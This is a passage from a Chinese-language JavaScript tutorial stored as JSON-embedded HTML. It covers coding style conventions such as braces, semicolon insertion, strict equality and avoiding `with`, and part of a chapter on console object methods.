捕捉到内部错误</code></pre><p>上面代码中，进入<code>catch</code>代码块之后，一遇到<code>throw</code>语句，就会去执行<code>finally</code>代码块，其中有<code>return false</code>语句，因此就直接返回了，不再会回去执行<code>catch</code>代码块剩下的部分了。</p>\n\n        <h2>\n            <a href='#参考连接' class='header-anchor'>#</a>\n            <span>参考连接</span>\n        </h2>\n    <ul>\n<li>Jani Hartikainen, <a href=\"http://davidwalsh.name/fix-javascript-errors\">JavaScript Errors and How to Fix Them</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"编程风格","link":"/features/style.html"}],"content":"\n        <h1>\n            <a href='#编程风格' class='header-anchor'>#</a>\n            <span>编程风格</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>”编程风格“（programming style）指的是编写代码的样式规则。不同的程序员，往往有不同的编程风格。</p>\n<p>有人说，编译器的规范叫做”语法规则“（grammar），这是程序员必须遵守的；而编译器忽略的部分，就叫”编程风格“（programming style），这是程序员可以自由选择的。这种说法不完全正确，程序员固然可以自由选择编程风格，但是好的编程风格有助于写出质量更高、错误更少、更易于维护的程序。</p>\n<p>所以，编程风格的选择不应该基于个人爱好、熟悉程度、打字量等因素，而要考虑如何尽量使代码清晰易读、减少出错。你选择的，不是你喜欢的风格，而是一种能够清晰表达你的意图的风格。这一点，对于 JavaScript 这种语法自由度很高的语言尤其重要。</p>\n<p>必须牢记的一点是，如果你选定了一种“编程风格”，就应该坚持遵守，切忌多种风格混用。如果你加入他人的项目，就应该遵守现有的风格。</p>\n\n        <h2>\n            <a href='#缩进' class='header-anchor'>#</a>\n            <span>缩进</span>\n        </h2>\n    <p>行首的空格和 Tab 键，都可以产生代码缩进效果（indent）。</p>\n<p>Tab 键可以节省击键次数，但不同的文本编辑器对 Tab 的显示不尽相同，有的显示四个空格，有的显示两个空格，所以有人觉得，空格键可以使得显示效果更统一。</p>\n<p>无论你选择哪一种方法，都是可以接受的，要做的就是始终坚持这一种选择。不要一会使用 Tab 键，一会使用空格键。</p>\n\n        <h2>\n            <a href='#区块' class='header-anchor'>#</a>\n            <span>区块</span>\n        </h2>\n    <p>如果循环和判断的代码体只有一行，JavaScript 允许该区块（block）省略大括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a)\n  b();\n  c();</code></pre><p>上面代码的原意可能是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a) {\n  b();\n  c();\n}</code></pre><p>但是，实际效果却是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a) {\n  b();\n}\n  c();</code></pre><p>因此，建议总是使用大括号表示区块。</p>\n<p>另外，区块起首的大括号的位置，有许多不同的写法。最流行的有两种，一种是起首的大括号另起一行。</p>\n<pre class=\"prettyprint language-javascript\"><code>block\n{\n  // ...\n}</code></pre><p>另一种是起首的大括号跟在关键字的后面。</p>\n<pre class=\"prettyprint language-javascript\"><code>block {\n  // ...\n}</code></pre><p>一般来说，这两种写法都可以接受。但是，JavaScript 要使用后一种，因为 JavaScript 会自动添加句末的分号，导致一些难以察觉的错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>return\n{\n  key: value\n};\n\n// 相当于\nreturn;\n{\n  key: value\n};</code></pre><p>上面的代码的原意，是要返回一个对象，但实际上返回的是<code>undefined</code>，因为 JavaScript 自动在<code>return</code>语句后面添加了分号。为了避免这一类错误，需要写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>return {\n  key : value\n};</code></pre><p>因此，表示区块起首的大括号，不要另起一行。</p>\n\n        <h2>\n            <a href='#圆括号' class='header-anchor'>#</a>\n            <span>圆括号</span>\n        </h2>\n    <p>圆括号（parentheses）在 JavaScript 中有两种作用，一种表示函数的调用，另一种表示表达式的组合（grouping）。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 圆括号表示函数的调用\nconsole.log(&#039;abc&#039;);\n\n// 圆括号表示表达式的组合\n(1 + 2) * 3</code></pre><p>建议可以用空格，区分这两种不同的括号。</p>\n<blockquote>\n<ol>\n<li><p>表示函数调用时，函数名与左括号之间没有空格。</p>\n</li>\n<li><p>表示函数定义时，函数名与左括号之间没有空格。</p>\n</li>\n<li><p>其他情况时，前面位置的语法元素与左括号之间，都有一个空格。</p>\n</li>\n</ol>\n</blockquote>\n<p>按照上面的规则，下面的写法都是不规范的。</p>\n<pre class=\"prettyprint language-javascript\"><code>foo (bar)\nreturn(a+b);\nif(a === 0) {...}\nfunction foo (b) {...}\nfunction(x) {...}</code></pre><p>上面代码的最后一行是一个匿名函数，<code>function</code>是语法关键字，不是函数名，所以与左括号之间应该要有一个空格。</p>\n\n        <h2>\n            <a href='#行尾的分号' class='header-anchor'>#</a>\n            <span>行尾的分号</span>\n        </h2>\n    <p>分号表示一条语句的结束。JavaScript 允许省略行尾的分号。事实上，确实有一些开发者行尾从来不写分号。但是，由于下面要讨论的原因，建议还是不要省略这个分号。</p>\n\n        <h3>\n            <a href='#不使用分号的情况' class='header-anchor'>#</a>\n            <span>不使用分号的情况</span>\n        </h3>\n    <p>首先，以下三种情况，语法规定本来就不需要在结尾添加分号。</p>\n<p><strong>（1）for 和 while 循环</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>for ( ; ; ) {\n} // 没有分号\n\nwhile (true) {\n} // 没有分号</code></pre><p>注意，<code>do...while</code>循环是有分号的。</p>\n<pre class=\"prettyprint language-javascript\"><code>do {\n  a--;\n} while(a &gt; 0); // 分号不能省略</code></pre><p><strong>（2）分支语句：if，switch，try</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>if (true) {\n} // 没有分号\n\nswitch () {\n} // 没有分号\n\ntry {\n} catch {\n} // 没有分号</code></pre><p><strong>（3）函数的声明语句</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n} // 没有分号</code></pre><p>注意，函数表达式仍然要使用分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function f() {\n};</code></pre><p>以上三种情况，如果使用了分号，并不会出错。因为，解释引擎会把这个分号解释为空语句。</p>\n\n        <h3>\n            <a href='#分号的自动添加' class='header-anchor'>#</a>\n            <span>分号的自动添加</span>\n        </h3>\n    <p>除了上一节的三种情况，所有语句都应该使用分号。但是，如果没有使用分号，大多数情况下，JavaScript 会自动添加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1\n// 等同于\nvar a = 1;</code></pre><p>这种语法特性被称为“分号的自动添加”（Automatic Semicolon Insertion，简称 ASI）。</p>\n<p>因此，有人提倡省略句尾的分号。麻烦的是，如果下一行的开始可以与本行的结尾连在一起解释，JavaScript 就不会自动添加分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 var a = 3\nvar\na\n=\n3\n\n// 等同于 &#039;abc&#039;.length\n&#039;abc&#039;\n.length\n\n// 等同于 return a + b;\nreturn a +\nb;\n\n// 等同于 obj.foo(arg1, arg2);\nobj.foo(arg1,\narg2);\n\n// 等同于 3 * 2 + 10 * (27 / 6)\n3 * 2\n+\n10 * (27 / 6)</code></pre><p>上面代码都会多行放在一起解释，不会每一行自动添加分号。这些例子还是比较容易看出来的，但是下面这个例子就不那么容易看出来了。</p>\n<pre class=\"prettyprint language-javascript\"><code>x = y\n(function () {\n  // ...\n})();\n\n// 等同于\nx = y(function () {...})();</code></pre><p>下面是更多不会自动添加分号的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 引擎解释为 c(d+e)\nvar a = b + c\n(d+e).toString();\n\n// 引擎解释为 a = b/hi/g.exec(c).map(d)\n// 正则表达式的斜杠，会当作除法运算符\na = b\n/hi/g.exec(c).map(d);\n\n// 解释为&#039;b&#039;[&#039;red&#039;, &#039;green&#039;]，\n// 即把字符串当作一个数组，按索引取值\nvar a = &#039;b&#039;\n[&#039;red&#039;, &#039;green&#039;].forEach(function (c) {\n  console.log(c);\n})\n\n// 解释为 function (x) { return x }(a++)\n// 即调用匿名函数，结果f等于0\nvar a = 0;\nvar f = function (x) { return x }\n(a++)</code></pre><p>只有下一行的开始与本行的结尾，无法放在一起解释，JavaScript 引擎才会自动添加分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a &lt; 0) a = 0\nconsole.log(a)\n\n// 等同于下面的代码，\n// 因为 0console 没有意义\nif (a &lt; 0) a = 0;\nconsole.log(a)</code></pre><p>另外，如果一行的起首是“自增”（<code>++</code>）或“自减”（<code>--</code>）运算符，则它们的前面会自动添加分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>a = b = c = 1\n\na\n++\nb\n--\nc\n\nconsole.log(a, b, c)\n// 1 2 0</code></pre><p>上面代码之所以会得到<code>1 2 0</code>的结果，原因是自增和自减运算符前，自动加上了分号。上面的代码实际上等同于下面的形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>a = b = c = 1;\na;\n++b;\n--c;</code></pre><p>如果<code>continue</code>、<code>break</code>、<code>return</code>和<code>throw</code>这四个语句后面，直接跟换行符，则会自动添加分号。这意味着，如果<code>return</code>语句返回的是一个对象的字面量，起首的大括号一定要写在同一行，否则得不到预期结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>return\n{ first: &#039;Jane&#039; };\n\n// 解释成\nreturn;\n{ first: &#039;Jane&#039; };</code></pre><p>由于解释引擎自动添加分号的行为难以预测，因此编写代码的时候不应该省略行尾的分号。</p>\n<p>不应该省略结尾的分号，还有一个原因。有些 JavaScript 代码压缩器（uglifier）不会自动添加分号，因此遇到没有分号的结尾，就会让代码保持原状，而不是压缩成一行，使得压缩无法得到最优的结果。</p>\n<p>另外，不写结尾的分号，可能会导致脚本合并出错。所以，有的代码库在第一行语句开始前，会加上一个分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>;var a = 1;\n// ...</code></pre><p>上面这种写法就可以避免与其他脚本合并时，排在前面的脚本最后一行语句没有分号，导致运行出错的问题。</p>\n\n        <h2>\n            <a href='#全局变量' class='header-anchor'>#</a>\n            <span>全局变量</span>\n        </h2>\n    <p>JavaScript 最大的语法缺点，可能就是全局变量对于任何一个代码块，都是可读可写。这对代码的模块化和重复使用，非常不利。</p>\n<p>因此，建议避免使用全局变量。如果不得不使用，可以考虑用大写字母表示变量名，这样更容易看出这是全局变量，比如<code>UPPER_CASE</code>。</p>\n\n        <h2>\n            <a href='#变量声明' class='header-anchor'>#</a>\n            <span>变量声明</span>\n        </h2>\n    <p>JavaScript 会自动将变量声明”提升“（hoist）到代码块（block）的头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (!x) {\n  var x = {};\n}\n\n// 等同于\nvar x;\nif (!x) {\n  x = {};\n}</code></pre><p>这意味着，变量<code>x</code>是<code>if</code>代码块之前就存在了。为了避免可能出现的问题，最好把变量声明都放在代码块的头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var i = 0; i &lt; 10; i++) {\n  // ...\n}\n\n// 写成\nvar i;\nfor (i = 0; i &lt; 10; i++) {\n  // ...\n}</code></pre><p>上面这样的写法，就容易看出存在一个全局的循环变量<code>i</code>。</p>\n<p>另外，所有函数都应该在使用之前定义。函数内部的变量声明，都应该放在函数的头部。</p>\n\n        <h2>\n            <a href='#with-语句' class='header-anchor'>#</a>\n            <span>with 语句</span>\n        </h2>\n    <p><code>with</code>可以减少代码的书写，但是会造成混淆。</p>\n<pre class=\"prettyprint language-javascript\"><code>with (o) {\n　foo = bar;\n}</code></pre><p>上面的代码，可以有四种运行结果：</p>\n<pre class=\"prettyprint language-javascript\"><code>o.foo = bar;\no.foo = o.bar;\nfoo = bar;\nfoo = o.bar;</code></pre><p>这四种结果都可能发生，取决于不同的变量是否有定义。因此，不要使用<code>with</code>语句。</p>\n\n        <h2>\n            <a href='#相等和严格相等' class='header-anchor'>#</a>\n            <span>相等和严格相等</span>\n        </h2>\n    <p>JavaScript 有两个表示相等的运算符：”相等“（<code>==</code>）和”严格相等“（<code>===</code>）。</p>\n<p>相等运算符会自动转换变量类型，造成很多意想不到的情况。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 == &#039;&#039;// true\n1 == true // true\n2 == true // false\n0 == &#039;0&#039; // true\nfalse == &#039;false&#039; // false\nfalse == &#039;0&#039; // true\n&#039; \\t\\r\\n &#039; == 0 // true</code></pre><p>因此，建议不要使用相等运算符（<code>==</code>），只使用严格相等运算符（<code>===</code>）。</p>\n\n        <h2>\n            <a href='#语句的合并' class='header-anchor'>#</a>\n            <span>语句的合并</span>\n        </h2>\n    <p>有些程序员追求简洁，喜欢合并不同目的的语句。比如，原来的语句是</p>\n<pre class=\"prettyprint language-javascript\"><code>a = b;\nif (a) {\n  // ...\n}</code></pre><p>他喜欢写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a = b) {\n  // ...\n}</code></pre><p>虽然语句少了一行，但是可读性大打折扣，而且会造成误读，让别人误解这行代码的意思是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if （a === b）{\n  // ...\n}</code></pre><p>建议不要将不同目的的语句，合并成一行。</p>\n\n        <h2>\n            <a href='#自增和自减运算符' class='header-anchor'>#</a>\n            <span>自增和自减运算符</span>\n        </h2>\n    <p>自增（<code>++</code>）和自减（<code>--</code>）运算符，放在变量的前面或后面，返回的值不一样，很容易发生错误。事实上，所有的<code>++</code>运算符都可以用<code>+= 1</code>代替。</p>\n<pre class=\"prettyprint language-javascript\"><code>++x\n// 等同于\nx += 1;</code></pre><p>改用<code>+= 1</code>，代码变得更清晰了。</p>\n<p>建议自增（<code>++</code>）和自减（<code>--</code>）运算符尽量使用<code>+=</code>和<code>-=</code>代替。</p>\n\n        <h2>\n            <a href='#switch...case-结构' class='header-anchor'>#</a>\n            <span>switch...case 结构</span>\n        </h2>\n    <p><code>switch...case</code>结构要求，在每一个<code>case</code>的最后一行必须是<code>break</code>语句，否则会接着运行下一个<code>case</code>。这样不仅容易忘记，还会造成代码的冗长。</p>\n<p>而且，<code>switch...case</code>不使用大括号，不利于代码形式的统一。此外，这种结构类似于<code>goto</code>语句，容易造成程序流程的混乱，使得代码结构混乱不堪，不符合面向对象编程的原则。</p>\n<pre class=\"prettyprint language-javascript\"><code>function doAction(action) {\n  switch (action) {\n    case &#039;hack&#039;:\n      return &#039;hack&#039;;\n      break;\n    case &#039;slash&#039;:\n      return &#039;slash&#039;;\n      break;\n    case &#039;run&#039;:\n      return &#039;run&#039;;\n      break;\n    default:\n      throw new Error(&#039;Invalid action.&#039;);\n  }\n}</code></pre><p>上面的代码建议改写成对象结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>function doAction(action) {\n  var actions = {\n    &#039;hack&#039;: function () {\n      return &#039;hack&#039;;\n    },\n    &#039;slash&#039;: function () {\n      return &#039;slash&#039;;\n    },\n    &#039;run&#039;: function () {\n      return &#039;run&#039;;\n    }\n  };\n\n  if (typeof actions[action] !== &#039;function&#039;) {\n    throw new Error(&#039;Invalid action.&#039;);\n  }\n\n  return actions[action]();\n}</code></pre><p>因此，建议<code>switch...case</code>结构可以用对象结构代替。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Eric Elliott, Programming JavaScript Applications, <a href=\"http://chimera.labs.oreilly.com/books/1234000000262/ch02.html\">Chapter 2. JavaScript Style Guide</a>, O&#39;Reilly, 2013</li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/07/meta-style-guide.html\">A meta style guide for JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/05/semicolon-insertion.html\">Automatic semicolon insertion in JavaScript</a></li>\n<li>Rod Vagg, <a href=\"http://dailyjs.com/2012/04/19/semicolons/\">JavaScript and Semicolons</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"console 对象与控制台","link":"/features/console.html"}],"content":"\n        <h1>\n            <a href='#console-对象与控制台' class='header-anchor'>#</a>\n            <span>console 对象与控制台</span>\n        </h1>\n    \n        <h2>\n            <a href='#console-对象' class='header-anchor'>#</a>\n            <span>console 对象</span>\n        </h2>\n    <p><code>console</code>对象是 JavaScript 的原生对象，它有点像 Unix 系统的标准输出<code>stdout</code>和标准错误<code>stderr</code>，可以输出各种信息到控制台，并且还提供了很多有用的辅助方法。</p>\n<p><code>console</code>的常见用途有两个。</p>\n<ul>\n<li>调试程序，显示网页代码运行时的错误信息。</li>\n<li>提供了一个命令行接口，用来与网页代码互动。</li>\n</ul>\n<p><code>console</code>对象的浏览器实现，包含在浏览器自带的开发工具之中。以 Chrome 浏览器的“开发者工具”（Developer Tools）为例，可以使用下面三种方法的打开它。</p>\n<ol>\n<li>按 F12 或者<code>Control + Shift + i</code>（PC）/ <code>Alt + Command + i</code>（Mac）。</li>\n<li>浏览器菜单选择“工具/开发者工具”。</li>\n<li>在一个页面元素上，打开右键菜单，选择其中的“Inspect Element”。</li>\n</ol>\n<p>打开开发者工具以后，顶端有多个面板。</p>\n<ul>\n<li><strong>Elements</strong>：查看网页的 HTML 源码和 CSS 代码。</li>\n<li><strong>Resources</strong>：查看网页加载的各种资源文件（比如代码文件、字体文件 CSS 文件等），以及在硬盘上创建的各种内容（比如本地缓存、Cookie、Local Storage等）。</li>\n<li><strong>Network</strong>：查看网页的 HTTP 通信情况。</li>\n<li><strong>Sources</strong>：查看网页加载的脚本源码。</li>\n<li><strong>Timeline</strong>：查看各种网页行为随时间变化的情况。</li>\n<li><strong>Performance</strong>：查看网页的性能情况，比如 CPU 和内存消耗。</li>\n<li><strong>Console</strong>：用来运行 JavaScript 命令。</li>\n</ul>\n<p>这些面板都有各自的用途，以下只介绍<code>Console</code>面板（又称为控制台）。</p>\n<p><code>Console</code>面板基本上就是一个命令行窗口，你可以在提示符下，键入各种命令。</p>\n\n        <h2>\n            <a href='#console-对象的静态方法' class='header-anchor'>#</a>\n            <span>console 对象的静态方法</span>\n        </h2>\n    <p><code>console</code>对象提供的各种静态方法，用来与控制台窗口互动。</p>\n\n        <h3>\n            <a href='#console.log()，console.info()，console.debug()' class='header-anchor'>#</a>\n            <span>console.log()，console.info()，console.debug()</span>\n        </h3>\n    <p><code>console.log</code>方法用于在控制台输出信息。它可以接受一个或多个参数，将它们连接起来输出。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039;Hello World&#039;)\n// Hello World\nconsole.log(&#039;a&#039;, &#039;b&#039;, &#039;c&#039;)\n// a b c</code></pre><p><code>console.log</code>方法会自动在每次输出的结尾，添加换行符。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(1);\nconsole.log(2);\nconsole.log(3);\n// 1\n// 2\n// 3</code></pre><p>如果第一个参数是格式字符串（使用了格式占位符），<code>console.log</code>方法将依次用后面的参数替换占位符，然后再进行输出。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039; %s + %s = %s&#039;, 1, 1, 2)\n//  1 + 1 = 2</code></pre><p>上面代码中，<code>console.log</code>方法的第一个参数有三个占位符（<code>%s</code>），第二、三、四个参数会在显示时，依次替换掉这个三个占位符。</p>\n<p><code>console.log</code>方法支持以下占位符，不同类型的数据必须使用对应的占位符。</p>\n<ul>\n<li><code>%s</code> 字符串</li>\n<li><code>%d</code> 整数</li>\n<li><code>%i</code> 整数</li>\n<li><code>%f</code> 浮点数</li>\n<li><code>%o</code> 对象的链接</li>\n<li><code>%c</code> CSS 格式字符串</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var number = 11 * 9;\nvar color = &#039;red&#039;;\n\nconsole.log(&#039;%d %s balloons&#039;, number, color);\n// 99 red balloons</code></pre><p>上面代码中，第二个参数是数值，对应的占位符是<code>%d</code>，第三个参数是字符串，对应的占位符是<code>%s</code>。</p>\n<p>使用<code>%c</code>占位符时，对应的参数必须是 CSS 代码，用来对输出内容进行CSS渲染。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(\n  &#039;%cThis text is styled!&#039;,\n  &#039;color: red; background: yellow; font-size: 24px;&#039;\n)</code></pre><p>上面代码运行后，输出的内容将显示为黄底红字。</p>\n<p><code>console.log</code>方法的两种参数格式，可以结合在一起使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039; %s + %s &#039;, 1, 1, &#039;= 2&#039;)\n// 1 + 1  = 2</code></pre><p>如果参数是一个对象，<code>console.log</code>会显示该对象的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log({foo: &#039;bar&#039;})\n// Object {foo: &quot;bar&quot;}\nconsole.log(Date)\n// function Date() { [native code] }</code></pre><p>上面代码输出<code>Date</code>对象的值，结果为一个构造函数。</p>\n<p><code>console.info</code>是<code>console.log</code>方法的别名，用法完全一样。只不过<code>console.info</code>方法会在输出信息的前面，加上一个蓝色图标。</p>\n<p><code>console.debug</code>方法与<code>console.log</code>方法类似，会在控制台输出调试信息。但是，默认情况下，<code>console.debug</code>输出的信息不会显示，只有在打开显示级别在<code>verbose</code>的情况下，才会显示。</p>\n<p><code>console</code>对象的所有方法，都可以被覆盖。因此，可以按照自己的需要，定义<code>console.log</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;log&#039;, &#039;info&#039;, &#039;warn&#039;, &#039;error&#039;].forEach(function(method) {\n  console[method] = console[method].bind(\n    console,\n    new Date().toISOString()\n  );\n});\n\nconsole.log(&quot;出错了！&quot;);\n// 2014-05-18T09:00.000Z 出错了！</code></pre><p>上面代码表示，使用自定义的<code>console.log</code>方法，可以在显示结果添加当前时间。</p>\n\n        <h3>\n            <a href='#console.warn()，console.error()' class='header-anchor'>#</a>\n            <span>console.warn()，console.error()</span>\n        </h3>\n    <p><code>warn</code>方法和<code>error</code>方法也是在控制台输出信息，它们与<code>log</code>方法的不同之处在于，<code>warn</code>方法输出信息时，在最前面加一个黄色三角，表示警告；<code>error</code>方法输出信息时，在最前面加一个红色的叉，表示出错。同时，还会高亮显示输出文字和错误发生的堆栈。其他方面都一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.error(&#039;Error: %s (%i)&#039;, &#039;Server is not responding&#039;, 500)\n// Error: Server is not responding (500)\nconsole.warn(&#039;Warning! Too few nodes (%d)&#039;, document.childNodes.length)\n// Warning! Too few nodes (1)</code></pre><p>可以这样理解，<code>log</code>方法是写入标准输出（<code>stdout</code>），<code>warn</code>方法和<code>error</code>方法是写入标准错误（<code>stderr</code>）。</p>\n\n        <h3>\n            <a href='#console.table()' class='header-anchor'>#</a>\n            <span>console.table()</span>\n        </h3>\n    <p>对于某些复合类型的数据，<code>console.table</code>方法可以将其转为表格显示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var languages = [\n  { name: &quot;JavaScript&quot;, fileExtension: &quot;.js&quot; },\n  { name: &quot;TypeScript&quot;, fileExtension: &quot;.ts&quot; },\n  { name: &quot;CoffeeScript&quot;, fileExtension: &quot;.coffee&quot; }\n];\n\nconsole.table(languages);</code></pre><p>上面代码的<code>language</code>变量，转为表格显示如下。</p>\n<table>\n<thead>\n<tr>\n<th>(index)</th>\n<th>name</th>\n<th>fileExtension</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>&quot;JavaScript&quot;</td>\n<td>&quot;.js&quot;</td>\n</tr>\n<tr>\n<td>1</td>\n<td>&quot;TypeScript&quot;</td>\n<td>&quot;.ts&quot;</td>\n</tr>\n<tr>\n<td>2</td>\n<td>&quot;CoffeeScript&quot;</td>\n<td>&quot;.coffee&quot;</td>\n</tr>\n</tbody></table>\n<p>下面是显示表格内容的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var languages = {\n  csharp: { name: &quot;C#&quot;, paradigm: &quot;object-oriented&quot; },\n  fsharp: { name: &quot;F#&quot;, paradigm: &quot;functional&quot; }\n};\n\nconsole.table(languages);</code></pre><p>上面代码的<code>language</code>，转为表格显示如下。</p>\n<table>\n<thead>\n<tr>\n<th>(index)</th>\n<th>name</th>\n<th>paradigm</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>csharp</td>\n<td>&quot;C#&quot;</td>\n<td>&quot;object-oriented&quot;</td>\n</tr>\n<tr>\n<td>fsharp</td>\n<td>&quot;F#&quot;</td>\n<td>&quot;functional&quot;</td>\n</tr>\n</tbody></table>\n\n        <h3>\n            <a href='#console.count()' class='header-anchor'>#</a>\n            <span>console.count()</span>\n        </h3>\n    <p><code>count</code>方法用于计数，输出它被调用了多少次。</p>\n<pre class=\"prettyprint language-javascript\"><code>function greet(user) {\n  console.count();\n  return &#039;hi &#039; + user;\n}\n\ngreet(&#039;bob&#039;)\n//  : 1\n// &quot;hi bob&quot;\n\ngreet(&#039;alice&#039;)\n//  : 2\n// &quot;hi alice&quot;\n\ngreet(&#039;bob&#039;)\n//  : 3\n// &quot;hi bob&quot;</code></pre><p>上面代码每次调用<code>greet</code>函数，内部的<code>console.count</code>方法就输出执行次数。</p>\n<p>该方法可以接受一个字符串作为参数，作为标签，对执行次数进行分类。</p>\n<pre class=\"prettyprint language-javascript\"><code>function greet(user) {\n  console.count(user);\n  return &quot;hi &quot; + user;\n}\n\ngreet(&#039;bob&#039;)\n// bob: 1\n// &quot;hi bob&quot;\n\ngreet(&#039;alice&#039;)\n// alice: 1\n// &quot;hi alice&quot;\n\ngreet(&#039;bob&#039;)\n// bob: 2\n// &quot;hi bob&quot;</code></pre><p>上面代码根据参数的不同，显示<code>bob</code>执行了两次，<code>alice</code>执行了一次。</p>\n\n        <h3>\n            <a href='#console.dir()，console.dirxml()' class='header-anchor'>#</a>\n            <span>console.dir()，console.dirxml()</span>\n        </h3>\n    <p><code>dir</code>方法用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log({f1: &#039;foo&#039;, f2: &#039;bar&#039;})\n// Object {f1: &quot;foo&quot;, f2: &quot;bar&quot;}\n\nconsole.dir({f1: &#039;foo&#039;, f2: &#039;bar&#039;})\n// Object\n//   f1: &quot;foo&quot;\n//   f2: &quot;bar&quot;\n//   __proto__: Object</code></pre><p>上面代码显示<code>dir</code>方法的输出结果，比<code>log</code>方法更易读，信息也更丰富。</p>\n<p>该方法对于输出 DOM 对象非常有用，因为会显示 DOM 对象的所有属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dir(document.body)</code></pre><p>Node 环境之中，还可以指定以代码高亮的形式输出。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dir(obj, {colors: true})</code></pre><p><code>dirxml</code>方法主要用于以目录树的形式，显示 DOM 节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dirxml(document.body)</code></pre><p>如果参数不是 DOM 节点，而是普通的 JavaScript 对象，<code>console.dirxml</code>等同于<code>console.dir</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.dirxml([1, 2, 3])\n// 等同于\nconsole.dir([1, 2, 3])</code></pre>\n        <h3>\n            <a href='#console.assert()' class='header-anchor'>#</a>\n            <span>console.assert()</span>\n        </h3>\n    <p><code>console.assert</code>方法主要用于程序运行过程中，进行条件判断，如果不满足条件，就显示一个错误，但不会中断程序执行。这样就相当于提示用户，内部状态不正确。</p>\n<p>它接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为<code>false</code>，才会提示有错误，在控制台输出第二个参数，否则不会有任何结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.assert(false, &#039;判断条件不成立&#039;)\n// Assertion failed: 判断条件不成立\n\n// 相当于\ntry {\n  if (false) {\n    throw new Error(&#039;判断条件不成立&#039;);\n  }\n} catch(e) {\n  console.error(e);\n}</code></pre><p>下面是一个例子，判断子节点的个数是否大于等于500。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.assert(list.childNodes.length &lt; 500, &#039;节点个数大于等于500&#039;)</code></pre><p>上面代码中，如果符合条件的节点小于500个，不会有任何输出；只有大于等于500时，才会在控制台提示错误，并且显示指定文本。</p>\n\n        <h3>\n            <a href='#console.time()，console.timeEnd()' class='header-anchor'>#</a>\n            <span>console.time()，console.timeEnd()</span>\n        </h3>\n    <p>这两个方法用于计时，可以算出一个操作所花费的准确时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.time(&#039;Array initialize&#039;);\n\nvar array= new Array(1000000);\nfor (var i = array.length - 1; i &gt;= 0; i--) {\n  array[i] = new Object();\n};\n\nconsole.timeEnd(&#039;Array initialize&#039;);\n// Array initialize: 1914.481ms</code></pre><p><code>time</code>方法表示计时开始，<code>timeEnd</code>方法表示计时结束。它们的参数是计时器的名称。调用<code>timeEnd</code>方法之后，控制台会显示“计时器名称: 所耗费的时间”。</p>\n\n        <h3>\n            <a href='#console.group()，console.groupEnd()，console.groupCollapsed()' class='header-anchor'>#</a>\n            <span>console.group()，console.groupEnd()，console.groupCollapsed()</span>\n        </h3>\n    <p><code>console.group</code>和<code>console.groupEnd</code>这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.group(&#039;一级分组&#039;);\nconsole.log(&#039;一级分组的内容&#039;);\n\nconsole.group(&#039;二级分组&#039;);\nconsole.log(&#039;二级分组的内容&#039;);\n\nconsole.groupEnd(); // 一级分组结束\nconsole.groupEnd(); // 二级分组结束</code></pre><p>上面代码会将“二级分组”显示在“一级分组”内部，并且“一级分组”和“二级分组”前面都有一个折叠符号，可以用来折叠本级的内容。</p>\n<p><code>console.groupCollapsed</code>方法与<code>console.group</code>方法很类似，唯一的区别是该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.groupCollapsed(&#039;Fetching 